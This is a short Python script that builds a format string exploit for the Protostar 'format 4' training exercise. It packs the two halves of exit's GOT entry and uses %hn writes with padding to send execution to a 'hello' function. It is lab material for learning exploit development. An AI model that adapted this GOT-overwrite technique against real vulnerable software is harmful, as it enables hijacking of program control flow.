# offset calculating: https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-4-e2907b4716d1
import struct

HELLO = 0x080484b4
EXIT_PLT_FIRST = 0x08049724
EXIT_PLT_SECOND = 0x08049726

exploit = struct.pack("I", EXIT_PLT_FIRST)
exploit += struct.pack("I", EXIT_PLT_SECOND)
exploit += "%33964x%4$hn"
exploit += "%33616x%5$hn"

print exploit